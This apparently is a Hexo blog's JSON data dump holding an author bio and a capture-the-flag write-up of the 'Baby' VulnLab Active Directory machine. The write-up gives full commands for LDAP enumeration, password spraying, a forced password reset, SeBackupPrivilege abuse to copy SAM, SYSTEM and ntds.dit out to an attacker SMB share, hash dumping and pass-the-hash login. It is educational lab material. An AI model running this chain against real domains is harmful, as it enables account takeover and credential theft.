/sendai-vl/f.png","hash":"ad338300875a881092c703de7d14368308decaed","modified":1720323557013},{"_id":"source/images/vulnlab/sendai-vl/i.png","hash":"cce0945d4d9f0870a3871ae72b18eaba593ea48e","modified":1720325797957},{"_id":"source/images/vulnlab/sendai-vl/j.png","hash":"e590b54039cba22ee8b3290eab228821658b57fd","modified":1720327136782},{"_id":"source/images/vulnlab/sendai-vl/k.png","hash":"6ced632d6acc26e5156b8dde302c89f610202a2f","modified":1720330480273},{"_id":"source/images/vulnlab/sendai-vl/d.png","hash":"aa0f3914815c5135de336e1bd8d635e89238b2e8","modified":1720308578808},{"_id":"source/images/vulnlab/sendai-vl/e.png","hash":"9faf44b06678156cea8801603a065076eeae4458","modified":1720310074124},{"_id":"source/images/vulnlab/sendai-vl/g.png","hash":"80f27e5392894078d6533c2f587159b3e3ca40f4","modified":1720324977452},{"_id":"source/images/vulnlab/sendai-vl/h.png","hash":"9bfc603f49291ea0946424742c9d0b977d162158","modified":1720328062802},{"_id":"source/images/vulnlab/sendai-vl/b.png","hash":"856d5b1c2fa9370b525af64520f00efd7021e868","modified":1720321610494},{"_id":"source/images/vulnlab/sendai-vl/c.png","hash":"a988b2b81838fbebc9f9073fbf9baf2606a1b9f4","modified":1720304123094},{"_id":"source/images/vulnlab/sendai-vl/sendai_slide.png","hash":"485099686d3c8b7b248eb18fd8d0fe46b56c01c1","modified":1720331162453},{"_id":"source/_posts/phantom.md","hash":"ce3c58c6f2d41af2e09fad89473399ce140f2d1e","modified":1720935264465},{"_id":"source/images/vulnlab/phantom-vl/b.png","hash":"84b078373f31d3e7510e9dcb3a958ea216e0fec7","modified":1720926761142},{"_id":"source/images/vulnlab/phantom-vl/d.png","hash":"fe4814759361c6f7b22c82aeb0dcda843044cd8b","modified":1720931841962},{"_id":"source/images/vulnlab/phantom-vl/c.png","hash":"a45554595240e6e4d3da4f7123e509ba25667395","modified":1720930310689},{"_id":"source/images/vulnlab/phantom-vl/e.png","hash":"22c1e7f11e75cc705cf06be2f1e3b4bbd58dd5f7","modified":1720932755240},{"_id":"source/images/vulnlab/phantom-vl/f.png","hash":"f7269f7dd37d7290173eed0be4bb6f2f7aa722cb","modified":1720933047270},{"_id":"source/images/vulnlab/phantom-vl/phantom_slide.png","hash":"bd786fdc069f938fc8d5601277257ceffc185c14","modified":1720935067495},{"_id":"source/_posts/job.md","hash":"92785ef7bdab0980342f333db400d1cc6715191b","modified":1720981441972},{"_id":"source/images/vulnlab/job-vl/d.png","hash":"22d80e914155463ffb90a0eb225503daba965b03","modified":1720978366491},{"_id":"source/images/vulnlab/job-vl/e.png","hash":"64e83eb4de0451003ec047e2105e0aa42ca47e57","modified":1720978876143},{"_id":"source/images/vulnlab/job-vl/g.png","hash":"89e118ffb2637347bf5e7e6fee749dc8c2d30fdf","modified":1720979986381},{"_id":"source/images/vulnlab/job-vl/h.png","hash":"894edad94b49181f0972984551fd368370683263","modified":1720980350433},{"_id":"source/images/vulnlab/job-vl/c.png","hash":"0467291ddacc7b86183e17fbfa3a83cf1c67c99e","modified":1720978021258},{"_id":"source/images/vulnlab/job-vl/f.png","hash":"33f6a2a54134de568756b47c6f30b668fc9fa0cf","modified":1720979571736},{"_id":"source/images/vulnlab/job-vl/job_slide.png","hash":"65fbf4b0326cff940dbc3854f8a3b3a7988a2cb7","modified":1720981257872},{"_id":"source/images/vulnlab/job-vl/b.png","hash":"8426a8038a25f6a57ac6c2af9838a5b7060f053f","modified":1720976225173},{"_id":"source/_posts/bruno.md","hash":"4c1842cda1282e2dcc1e69b3818b0b7e8a756ab0","modified":1722631326309},{"_id":"source/images/vulnlab/bruno-vl/b.png","hash":"118c1ad7c8f6d31de5cf5f5052431be386b8e8e8","modified":1722478509778},{"_id":"source/images/vulnlab/bruno-vl/d.png","hash":"0153fff71ce5e92a6110cc3d4cc1142a51fea210","modified":1722397433289},{"_id":"source/images/vulnlab/bruno-vl/e.png","hash":"92884e9271f60817fdb2a6fa1dc054500fd4ca56","modified":1722480125014},{"_id":"source/images/vulnlab/bruno-vl/f.png","hash":"9852932e2de3ce9fc20a1b1ec47b21d1392ddd3a","modified":1722627548062},{"_id":"source/images/vulnlab/bruno-vl/j.png","hash":"45ecad65840a44ac51f9dee8cbe7894bc106c341","modified":1722610156211},{"_id":"source/images/vulnlab/bruno-vl/l.png","hash":"dca0fe80dfebddbd9de5745b58b0a5aefe23855d","modified":1722611709359},{"_id":"source/images/vulnlab/bruno-vl/h.png","hash":"8e46091b9154aa7e815e829c1a5f0c1622af8730","modified":1722629816537},{"_id":"source/images/vulnlab/bruno-vl/i.png","hash":"2d172d1f4cc607347880eb9c934dc3dc2451efcd","modified":1722629979629},{"_id":"source/images/vulnlab/bruno-vl/k.png","hash":"3f133ce1658fe88253fadf64a6b3b7a9857ba253","modified":1722611617280},{"_id":"source/images/vulnlab/bruno-vl/m.png","hash":"efd693feda607e4e65b7660936a97e4f1c0eb17b","modified":1722621500376},{"_id":"source/images/vulnlab/bruno-vl/g.png","hash":"3ef5ed571d4c09600b4daf35fdd5deef5cc70564","modified":1722629404489},{"_id":"source/images/vulnlab/bruno-vl/c.png","hash":"c84fedbcfc3a68bdfa61e150874c818250d94e0b","modified":1722479870054},{"_id":"source/images/vulnlab/bruno-vl/bruno_slide.png","hash":"0d450385995ff625074a1f8439cd3aaff04f9eb2","modified":1722630937279},{"_id":"source/_posts/media.md","hash":"a5e095bca5b9224e19a57cf99ec191b7b89f5f1e","modified":1723125160646},{"_id":"source/images/vulnlab/media-vl/d.png","hash":"4c5792f370fa77bdb4a10400c6af54115ec01541","modified":1723082447161},{"_id":"source/images/vulnlab/media-vl/e.png","hash":"81f72490169cfb2225c13a764e30153ba3bf9c8b","modified":1723089702565},{"_id":"source/images/vulnlab/media-vl/f.png","hash":"5b693963cfb429710ba8cc31e514c709c7d64a84","modified":1723089777681},{"_id":"source/images/vulnlab/media-vl/h.png","hash":"b2c64c635db439514170b43407e6718a9d34f865","modified":1723091101499},{"_id":"source/images/vulnlab/media-vl/g.png","hash":"21b577fa5228a944d7a01dff3ce56a218436826e","modified":1723090542485},{"_id":"source/images/vulnlab/media-vl/media_slide.png","hash":"4efb1f6ebe5fcb9d1ca1e9f5fbfb299585fccb41","modified":1723124856536},{"_id":"source/images/vulnlab/media-vl/c.png","hash":"9bb9b7938fc17b6d002e0c3fc735a8e99371b6e8","modified":1723082302454},{"_id":"source/images/vulnlab/media-vl/b.png","hash":"d417a51e8b7621b7d4f25edbdc545caaac831cf0","modified":1723082191916}],"Category":[{"name":"Vulnlab","_id":"clx0u1gtl0000ttufdk7w7pc0"},{"name":"vulnlab","_id":"clx0w93qb000067ufedeh9ivq"},{"name":"research","_id":"clx2nhkeq000169ufd9asdzho"}],"Data":[],"Page":[{"title":"tags","date":"2024-06-04T21:57:26.000Z","_content":"","source":"tags/index.md","raw":"---\ntitle: tags\ndate: 2024-06-04 17:57:26\n---\n","updated":"2024-06-04T21:57:26.315Z","path":"tags/index.html","comments":1,"layout":"page","_id":"clx0xxmil0000iguf7d9v72zb","content":"","cover":false,"excerpt":"","more":""},{"title":"About Me","date":"2024-06-06T01:17:29.000Z","tags":["About"],"categories":"vulnlab","keywords":"About","top_img":"/images/cyberpunk-red.jpg","_content":"\nMy name is Daniel Feliciano. I am a certified Red Team Operator and recently graduated student from Pennsylvania State University at University Park. I have completed a major in Cybersecurity Analytics & Operations and a minor in Information Sciences & Technology. During my time at Penn State, I was the 2023 team captain of Penn State’s renowned ethical hacking team, a subsidiary of the larger Competitive Cybersecurity Organization at Penn State. I am also interested in culinary arts and traveling.\n\nOffensive security is not just a tool that can be used to describe and discover vulnerabilities in organization's in question, it can also be used as a learning experience in ethical hackers and security analysts alike. Data protection, resource retention, and public safety are all factors that contribute to the success of an organization.\n\n>“The more I risk being rejected, the better my chances are of being accepted.” - Robert Kiyosaki\n\nCybersecurity does not have one particular vector of protection. People like myself have understood that there are always routes that an infrastructure is vulnerable to. Unfortunately, a world where data is 100% secure will never be feasible. It is the responsibility of organizations to understand this probability and always be on their heels at any given moment.\n\n>“The people who are crazy enough to think they can change the world are the ones who do.” - Steve Jobs\n\nLeadership is a crucial role in understanding not only offensive security in my career field, but a life-role when it comes to understanding problems and issues. This is a common concern in society, as many organizations are able to understand their issues however they are not sure how to action on them. It takes a leader to both understand these problems and to know how to push them into the big picture.\n\n>The pessimist complains about the wind. The optimist expects it to change. The leader adjusts the sails.” - John Maxwell\n\nI hope you enjoy the content and research within my website.","source":"about/index.md","raw":"---\ntitle: About Me\ndate: 2024-06-05 21:17:29\ntags: [About]\ncategories: vulnlab\nkeywords: 'About'\ntop_img: /images/cyberpunk-red.jpg\n---\n\nMy name is Daniel Feliciano. I am a certified Red Team Operator and recently graduated student from Pennsylvania State University at University Park. I have completed a major in Cybersecurity Analytics & Operations and a minor in Information Sciences & Technology. During my time at Penn State, I was the 2023 team captain of Penn State’s renowned ethical hacking team, a subsidiary of the larger Competitive Cybersecurity Organization at Penn State. I am also interested in culinary arts and traveling.\n\nOffensive security is not just a tool that can be used to describe and discover vulnerabilities in organization's in question, it can also be used as a learning experience in ethical hackers and security analysts alike. Data protection, resource retention, and public safety are all factors that contribute to the success of an organization.\n\n>“The more I risk being rejected, the better my chances are of being accepted.” - Robert Kiyosaki\n\nCybersecurity does not have one particular vector of protection. People like myself have understood that there are always routes that an infrastructure is vulnerable to. Unfortunately, a world where data is 100% secure will never be feasible. It is the responsibility of organizations to understand this probability and always be on their heels at any given moment.\n\n>“The people who are crazy enough to think they can change the world are the ones who do.” - Steve Jobs\n\nLeadership is a crucial role in understanding not only offensive security in my career field, but a life-role when it comes to understanding problems and issues. This is a common concern in society, as many organizations are able to understand their issues however they are not sure how to action on them. It takes a leader to both understand these problems and to know how to push them into the big picture.\n\n>The pessimist complains about the wind. The optimist expects it to change. The leader adjusts the sails.” - John Maxwell\n\nI hope you enjoy the content and research within my website.","updated":"2024-06-06T02:51:33.622Z","path":"about/index.html","_id":"clx2n0pxf0000rjufg5v3e0p4","comments":1,"layout":"page","content":"<p>My name is Daniel Feliciano. I am a certified Red Team Operator and recently graduated student from Pennsylvania State University at University Park. I have completed a major in Cybersecurity Analytics &amp; Operations and a minor in Information Sciences &amp; Technology. During my time at Penn State, I was the 2023 team captain of Penn State’s renowned ethical hacking team, a subsidiary of the larger Competitive Cybersecurity Organization at Penn State. I am also interested in culinary arts and traveling.</p>\n<p>Offensive security is not just a tool that can be used to describe and discover vulnerabilities in organization’s in question, it can also be used as a learning experience in ethical hackers and security analysts alike. Data protection, resource retention, and public safety are all factors that contribute to the success of an organization.</p>\n<blockquote>\n<p>“The more I risk being rejected, the better my chances are of being accepted.” - Robert Kiyosaki</p>\n</blockquote>\n<p>Cybersecurity does not have one particular vector of protection. People like myself have understood that there are always routes that an infrastructure is vulnerable to. Unfortunately, a world where data is 100% secure will never be feasible. It is the responsibility of organizations to understand this probability and always be on their heels at any given moment.</p>\n<blockquote>\n<p>“The people who are crazy enough to think they can change the world are the ones who do.” - Steve Jobs</p>\n</blockquote>\n<p>Leadership is a crucial role in understanding not only offensive security in my career field, but a life-role when it comes to understanding problems and issues. This is a common concern in society, as many organizations are able to understand their issues however they are not sure how to action on them. It takes a leader to both understand these problems and to know how to push them into the big picture.</p>\n<blockquote>\n<p>The pessimist complains about the wind. The optimist expects it to change. The leader adjusts the sails.” - John Maxwell</p>\n</blockquote>\n<p>I hope you enjoy the content and research within my website.</p>\n","cover":false,"excerpt":"","more":"<p>My name is Daniel Feliciano. I am a certified Red Team Operator and recently graduated student from Pennsylvania State University at University Park. I have completed a major in Cybersecurity Analytics &amp; Operations and a minor in Information Sciences &amp; Technology. During my time at Penn State, I was the 2023 team captain of Penn State’s renowned ethical hacking team, a subsidiary of the larger Competitive Cybersecurity Organization at Penn State. I am also interested in culinary arts and traveling.</p>\n<p>Offensive security is not just a tool that can be used to describe and discover vulnerabilities in organization’s in question, it can also be used as a learning experience in ethical hackers and security analysts alike. Data protection, resource retention, and public safety are all factors that contribute to the success of an organization.</p>\n<blockquote>\n<p>“The more I risk being rejected, the better my chances are of being accepted.” - Robert Kiyosaki</p>\n</blockquote>\n<p>Cybersecurity does not have one particular vector of protection. People like myself have understood that there are always routes that an infrastructure is vulnerable to. Unfortunately, a world where data is 100% secure will never be feasible. It is the responsibility of organizations to understand this probability and always be on their heels at any given moment.</p>\n<blockquote>\n<p>“The people who are crazy enough to think they can change the world are the ones who do.” - Steve Jobs</p>\n</blockquote>\n<p>Leadership is a crucial role in understanding not only offensive security in my career field, but a life-role when it comes to understanding problems and issues. This is a common concern in society, as many organizations are able to understand their issues however they are not sure how to action on them. It takes a leader to both understand these problems and to know how to push them into the big picture.</p>\n<blockquote>\n<p>The pessimist complains about the wind. The optimist expects it to change. The leader adjusts the sails.” - John Maxwell</p>\n</blockquote>\n<p>I hope you enjoy the content and research within my website.</p>\n"}],"Post":[{"title":"Baby - VulnLab","date":"2024-06-04T19:43:29.000Z","keywords":"Vulnlab, Easy, Windows","description":"This machine is a more beginner-level Active Directory machine, however it's very useful if you want to understand fundamentals of AD and how to exploit it. You'll see a lot of techniques here in more difficult machines (though they may be used differently).","cover":"/images/vulnlab/baby-vl/baby_slide.png","top_img":"/images/cyberpunk-red.jpg","toc":true,"toc_number":false,"_content":"\n\nThis machine is a more beginner-level Active Directory machine, however it's very useful if you want to understand fundamentals of AD and how to exploit it. You'll see a lot of techniques here in more difficult machines (though they may be used differently).\n\n# Enumeration\n\nWith that, let's run our base NMAP scan.\n\n```Kali\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-29 17:18 EDT\nNmap scan report for 10.10.99.70\nHost is up (0.11s latency).\nNot shown: 987 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n53/tcp   open  domain\n88/tcp   open  kerberos-sec\n135/tcp  open  msrpc\n139/tcp  open  netbios-ssn\n389/tcp  open  ldap\n445/tcp  open  microsoft-ds\n464/tcp  open  kpasswd5\n593/tcp  open  http-rpc-epmap\n636/tcp  open  ldapssl\n3268/tcp open  globalcatLDAP\n3269/tcp open  globalcatLDAPssl\n3389/tcp open  ms-wbt-server\n5357/tcp open  wsdapi\n\nNmap done: 1 IP address (1 host up) scanned in 17.63 seconds\n```\n\nYou'll see that we have a few ports to look at initially, notably SMB and LDAP. There is no initial web service, so we'll check out the former ports. Let's run another NMAP scan against the LDAP service so we can grab the NetBIOS name and FQDN of the machine.\n\n\n```Kali\n└─$ sudo nmap 10.10.99.70 -A\n\n3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)\n|   DNS_Computer_Name: BabyDC.baby.vl\n| ssl-cert: Subject: commonName=BabyDC.baby.vl\n```\n\nLet's add these to our `/etc/hosts` file so we can resolve any future enumeration techniques to the correct DNS name. Furthermore, attempting to authenticate to SMB seems to not return anything in particular.\n\n```Kali\n└─$ smbclient -L 10.10.99.70 -N\nAnonymous login successful\n\n        Sharename       Type      Comment\n        ---------       ----      -------\nReconnecting with SMB1 for workgroup listing.\ndo_connect: Connection to 10.10.99.70 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup available\n```\n\nSMB does not seem to be helpful as of right now, so let's try to focus on LDAP. Normally, it's an extremely insecure practice to allow null LDAP enumeration. That being said, there's no harm in trying to run a few queries with LDAP to test for any responses.\n\n# LDAP Enumeration\n\nLet's first test for null authentication and query LDAP for all domain objects in the domain.\n\n```Kali\n└─$ ldapsearch -x -H ldap://BabyDC.baby.vl:389 -D '' -w '' -b \"DC=baby,DC=vl\"\n\n# extended LDIF\n#\n# LDAPv3\n# base <DC=baby,DC=vl> with scope subtree\n# filter: (objectclass=*)\n# requesting: ALL\n#\n\n# baby.vl\ndn: DC=baby,DC=vl\n\n# Administrator, Users, baby.vl\ndn: CN=Administrator,CN=Users,DC=baby,DC=vl\n[...snip...]\n```\n\nYou can see from the result that all of the domain objects were returned, meaning that we are able to query LDAP for essentially any domain object we'd like. If we were on a Windows workstation that was within the domain, we could use tools like `ADSearch` or `PowerView` to query for any users, groups, essentially any domain object we'd like.\n\nLet's adjust our LDAP search query so we can create a user list.\n\n```Kali\n└─$ ldapsearch -x -H ldap://BabyDC.baby.vl:389 -D '' -w '' -b \"DC=baby,DC=vl\" | grep '@baby.vl' | awk '{print $2}' | cut -d '@' -f 1 > ul.txt; cat ul.txt\n\nJacqueline.Barnett\nAshley.Webb\nHugh.George\nLeonard.Dyer\nConnor.Wilkinson\nJoseph.Hughes\nKerry.Wilson\nTeresa.Bell\n```\n\nI was getting ready to run some tests using this wordlist, but if you do a quick check over the LDAP dump you'll see that we missed a few users. I wasn't certain if this was an LDAP issue or a `grep` issue, but nonetheless I copied the remaining users into the wordlist. (`Caroline.Robinson` and `Ian.Walker`)\n\nYou'll notice at the end of the same full LDAP dump output under `Teresa.Bell`, there seems to be a description comment that says `description: Set initial password to [...snip...`.\n\nWe can infer based on the message that this is the initial password for users when they are created. Now that we have a list of users and a potential password, we can use `crackmapexec` to test if any users have this password still set to their account. We'll use SMB as our service to test against since we really don't need to query anything for LDAP anymore (since we can already dump the entire domain with null credentials).\n\n```Kali\n└─$ for user in $(cat ul.txt); do crackmapexec smb BabyDC.baby.vl -u $user -p 'BabyStart123!'; done\n\n[...snip...]\nSMB         BabyDC.baby.vl  445    BABYDC           [-] baby.vl\\Caroline.Robinson:[...snip...] STATUS_PASSWORD_MUST_CHANGE\n[...snip...]\n```\n\nYou'll notice that we'll get a hit on `Caroline.Robinson`, stating that their password needs to change. This more than likely is notifying us that the user has not done their initial authentication to the domain yet or that they have gone past the password reset policy deadline. This can be the case with new employees and/or interns.\n\n# Password Reset with SMBPasswd\n\nIn that case let's try to reset their password with `smbpasswd`. The only pre-reqs to this is that we specify the username and the specific remote machine we want to change it for.\n\n```Kali\nsmbpasswd -r BabyDC.baby.vl -U BABYDC/'Caroline.Robinson'\n\nOld SMB password: ([...snip...])\nNew SMB password: password123@\nRetype new SMB password: password123@\nPassword changed for user Caroline.Robinson\n```\n\nIf we test the same `crackmapexec` command as above for `Caroline.Robinson`, we can see that their password was successfully updated. Normally I'd now dump the LDAP with bloodhound to get all of the domain objects into a GUI, but if we test `crackmapexec` against WinRM we can see that we already are able to login as this user.\n\n```Kali\n└─$ crackmapexec winrm BabyDC.baby.vl -u 'Caroline.Robinson' -p 'password123@'\nSMB         BabyDC.baby.vl  5985   BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)\nHTTP        BabyDC.baby.vl  5985   BABYDC           [*] http://BabyDC.baby.vl:5985/wsman\nWINRM       BabyDC.baby.vl  5985   BABYDC           [+] baby.vl\\Caroline.Robinson:password123@ (Pwn3d!)\n```\n\nAfter logging in, you can find the user flag within the user's Desktop directory.\n\n![image1](/images/vulnlab/baby-vl/b.png \"B\")\n\n# Privilege Escalation w/ SeBackupPrivilege\n\nLet's do a quick privilege to see if there's anything that we can exploit.\n\n```Evil-WinRM\n*Evil-WinRM* PS C:\\Users\\Caroline.Robinson\\Documents> whoami /priv\n\nPrivilege Name                Description                    State\n============================= ============================== =======\nSeMachineAccountPrivilege     Add workstations to domain     Enabled\nSeBackupPrivilege             Back up files and directories  Enabled\nSeRestorePrivilege            Restore files and directories  Enabled\n[...snip...]\n```\n\nYou'll see from the output that we have `SeBackupPrivilege` enabled for our user. This essentially means that we can backup various parts of the filesystem. In most cases, this can be for a engineer or technical support user and seems harmless at first glance. However, this means we can also backup sensitive files such as the `SAM` and `SYSTEM` databases. These database essentially house user accounts and security objects for all domain objects on the machine. The only issue is that this also houses user passwords, meaning if we dump these databases we can view the password for every user on the machine.\n\nSo first, let's dump both of these databases into a temporary directory.\n\n```Evil-WinRM\n*Evil-WinRM* PS C:\\Users\\Caroline.Robinson\\Documents> mkdir C:\\temp\n*Evil-WinRM* PS C:\\Users\\Caroline.Robinson\\Documents> reg save hklm\\sam c:\\temp\\sam\n*Evil-WinRM* PS C:\\Users\\Caroline.Robinson\\Documents> reg save hklm\\system c:\\temp\\system\n```\n\nThese files will now be saved to our temporary directory, in which we can download them to our local machine. This machine does have AV enabled so we won't be able to set up a simple C2 server's without obfuscating our payloads, meaning we'll need to find a way to transfer our files back and forth in a inconspicuous manner.\n\nWe can use Impacket's `smbserver` to spin up a quick SMB server, to which we can then transfer our files to our Kali machine.\n\n```Evil-WinRM -> Kali\n└─$ mkdir share/\n\n└─$ impacket-smbserver smb share/ -smb2support\n\n*Evil-WinRM* PS C:\\temp> copy sam \\\\(Kali IP)\\smb\\sam\n*Evil-WinRM* PS C:\\temp> copy system \\\\(Kali IP)\\smb\\system\n```\n\nYou'll notice a lot of output from our SMB server when we're copying the files over, this is just a built-in Impacket functionality that will dump the user's NetNTLM hash when they authenticate to our SMB server. We can ignore this, and if we look at the `share/` directory we'll see the two files that we downloaded are in this folder.\n\nNow that we have both of these files, let's run `samdump` on them to retrieve credentials that are within these two databases.\n\n```Kali\n└─$ samdump2 system sam\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:[...snip...]:::\n*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n*disabled* :503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n*disabled* ä:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n```\n\nNow that we have the Administrator's hash, let's test the creds once more with `crackmapexec` and by passing the hash to it.\n\n```Kali\n└─$ crackmapexec winrm BabyDC.baby.vl -u 'Administrator' -H '[...snip...]'\nSMB         BabyDC.baby.vl  5985   BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)\nHTTP        BabyDC.baby.vl  5985   BABYDC           [*] http://BabyDC.baby.vl:5985/wsman\nWINRM       BabyDC.baby.vl  5985   BABYDC           [-] baby.vl\\Administrator:[...snip...]\n```\n\nThe thing is, this will fail. The Administrator hash above is not an Administrator hash that we can login with. There is a hash of an account with the same username on the DC, meaning we'll need to look a little further with our `SeBackupPrivilege` to dump another file.\n\n# Diskshadow/Robocopy for NTDS.dit\n\nThe file in particular that we're looking for is a copy of the `C:\\`'s ntds database, which stores Active Directory information of the respective filesystem path. We can use this along with our previously obtained `SAM` and `SYSTEM` databases to dump the AD secrets of the domain controller.\n\nTo exploit this, we can use `diskshadow` and `robocopy` to create a copy of the current drive and copy the copied filesystem back to the `C:\\` drive. (Credit goes to Nairuz Abulhul for their explanation of this exploit in their article [here](https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960).)\n\nLet's first create a file named `script.txt` and transfer it to our `Evil-WinRM` session. The contents of the script can be seen below.\n\n```diskshadow\nset metadata C:\\Windows\\Temp\\meta.cabX\nset context clientaccessibleX\nset context persistentX\nbegin backupX\nadd volume C: alias cdriveX\ncreateX\nexpose %cdrive% E:X\nend backupX\n```\n\n1. `set metadata C:\\Windows\\Temp\\meta.cabX`: This command is setting metadata for the backup operation. It seems to be specifying the location where metadata related to the backup will be stored, in this case, `C:\\Windows\\Temp\\meta.cabX`.\n    \n2. `set context clientaccessibleX`: This command is setting the context for the backup operation. It seems to be specifying that the backup should be accessible by the client. The `X` might be a placeholder or a variable.\n    \n3. `set context persistentX`: This command is setting another context for the backup operation. It could be specifying that the backup should be persistent, meaning it should remain available or stored for a certain period. The `X` might be a placeholder or a variable.\n    \n4. `begin backupX`: This command is initiating the backup operation. The `X` might be a placeholder or a variable.\n    \n5. `add volume C: alias cdriveX`: This command is adding the volume `C:` to the backup operation with an alias `cdriveX`. This means that the contents of the `C:` drive will be included in the backup. The `X` might be a placeholder or a variable.\n    \n6. `createX`: This command is creating something related to the backup operation. It's not entirely clear what it's creating without more context or additional information about the script.\n    \n7. `expose %cdrive% E:X`: This command seems to be exposing the contents of the `C:` drive, which was added to the backup operation with the alias `cdriveX`, to a location specified by `%cdrive%` on drive `E:`. This might involve mounting the backup or making it accessible in some way. The `X` might be a placeholder or a variable.\n    \n8. `end backupX`: This command is ending the backup operation. The `X` might be a placeholder or a variable.\n\nLet's set up a simple Python server so we can curl this script to our WinRM session.\n\n```Kali\n└─$ python3 -m http.server 9001\n\n*Evil-WinRM* PS C:\\temp> curl http://(Kali IP):9001/script.txt -O script.txt\n```\n\nNext, let's run `diskshadow` to create a copy of the `C:\\` drive.\n\n```Evil-WinRM\ndiskshadow /s script.txt\n```\n\nAfter the filesystem copy finishes, it will be saved to `E:\\Windows`. This is where we can use `robocopy` to move it back to our `C:\\` drive.\n\n`robocopy /b E:\\Windows\\ntds . ntds.dit`\n\nLet's now use our SMB server on our Kali machine to download the `ntds.dit` file from the WinRM session.\n\n```Evil-WinRM\n*Evil-WinRM* PS C:\\temp> copy ntds.dit \\\\10.8.0.173\\smb\\ntds.dit\n```\n\nFrom here, all that's left to do is retrieve the correct NTLM hashes by dumping the DC secrets with `impacket-secretsdump`.\n\n```Kali\nimpacket-secretsdump -sam sam -system system -ntds ntds.dit LOCAL\nImpacket v0.12.0.dev1 - Copyright 2023 Fortra\n\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:[...snip...]:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nBABYDC$:1000:aad3b435b51404eeaad3b435b51404ee:[...snip...]:::\n```\n\nThis will dump the NTLM hashes for every user that has the ability to login to a service on the domain controller. At the bottom of the output, you'll find hashes for all of the AD users that we dumped through LDAP at the beginning of this machine.\n\nUnderneath `[*] Reading and decrypting hashes from ntds.dit`, we'll find the correct NTLM hash for the Administrator user. We can verify our ability to connect with this using `crackmapexec` once more.\n\n```Kali\n└─$ crackmapexec winrm BabyDC.baby.vl -u 'Administrator' -H '[...snip...]'\nSMB         BabyDC.baby.vl  5985   BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)\nHTTP        BabyDC.baby.vl  5985   BABYDC           [*] http://BabyDC.baby.vl:5985/wsman\nWINRM       BabyDC.baby.vl  5985   BABYDC           [+] baby.vl\\Administrator:[...snip...] (Pwn3d!)\n```\n\nThus, we have the ability to log in through WinRM as the Administrator. The root hash can be found within the Administrator's Desktop directory.\n\n![image2](/images/vulnlab/baby-vl/c.png \"C\")\n\n# Conclusion\n\nThis means we have rooted this machine! Credit goes to xct for the development of this machine. As said previously, this machine is really helpful if you want to learn Active Directory basics.\n\n# Resources\n\nhttps://lonewolf.my.site.com/s/article/DPN-Reset-Samba-Passwords#:~:text=At%20the%20%23%20prompt%20type%20in,is%20to%20reset%20the%20password.&text=To%20set%20up%20a%20new,will%20ask%20for%20the%20password\nhttps://github.com/BishopFox/sliver\nhttps://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960\n\n\n","source":"_posts/baby-vl.md","raw":"---\ntitle: Baby - VulnLab\ndate: 2024-06-04 15:43:29\ntags: [vulnlab, Easy]\ncategories: vulnlab\nkeywords: 'Vulnlab, Easy, Windows'\ndescription: This machine is a more beginner-level Active Directory machine, however it's very useful if you want to understand fundamentals of AD and how to exploit it. You'll see a lot of techniques here in more difficult machines (though they may be used differently).\ncover: /images/vulnlab/baby-vl/baby_slide.png\ntop_img: /images/cyberpunk-red.jpg\ntoc: true\ntoc_number: false\n---\n\n\nThis machine is a more beginner-level Active Directory machine, however it's very useful if you want to understand fundamentals of AD and how to exploit it. You'll see a lot of techniques here in more difficult machines (though they may be used differently).\n\n# Enumeration\n\nWith that, let's run our base NMAP scan.\n\n```Kali\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-29 17:18 EDT\nNmap scan report for 10.10.99.70\nHost is up (0.11s latency).\nNot shown: 987 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n53/tcp   open  domain\n88/tcp   open  kerberos-sec\n135/tcp  open  msrpc\n139/tcp  open  netbios-ssn\n389/tcp  open  ldap\n445/tcp  open  microsoft-ds\n464/tcp  open  kpasswd5\n593/tcp  open  http-rpc-epmap\n636/tcp  open  ldapssl\n3268/tcp open  globalcatLDAP\n3269/tcp open  globalcatLDAPssl\n3389/tcp open  ms-wbt-server\n5357/tcp open  wsdapi\n\nNmap done: 1 IP address (1 host up) scanned in 17.63 seconds\n```\n\nYou'll see that we have a few ports to look at initially, notably SMB and LDAP. There is no initial web service, so we'll check out the former ports. Let's run another NMAP scan against the LDAP service so we can grab the NetBIOS name and FQDN of the machine.\n\n\n```Kali\n└─$ sudo nmap 10.10.99.70 -A\n\n3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)\n|   DNS_Computer_Name: BabyDC.baby.vl\n| ssl-cert: Subject: commonName=BabyDC.baby.vl\n```\n\nLet's add these to our `/etc/hosts` file so we can resolve any future enumeration techniques to the correct DNS name. Furthermore, attempting to authenticate to SMB seems to not return anything in particular.\n\n```Kali\n└─$ smbclient -L 10.10.99.70 -N\nAnonymous login successful\n\n        Sharename       Type      Comment\n        ---------       ----      -------\nReconnecting with SMB1 for workgroup listing.\ndo_connect: Connection to 10.10.99.70 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup available\n```\n\nSMB does not seem to be helpful as of right now, so let's try to focus on LDAP. Normally, it's an extremely insecure practice to allow null LDAP enumeration. That being said, there's no harm in trying to run a few queries with LDAP to test for any responses.\n\n# LDAP Enumeration\n\nLet's first test for null authentication and query LDAP for all domain objects in the domain.\n\n```Kali\n└─$ ldapsearch -x -H ldap://BabyDC.baby.vl:389 -D '' -w '' -b \"DC=baby,DC=vl\"\n\n# extended 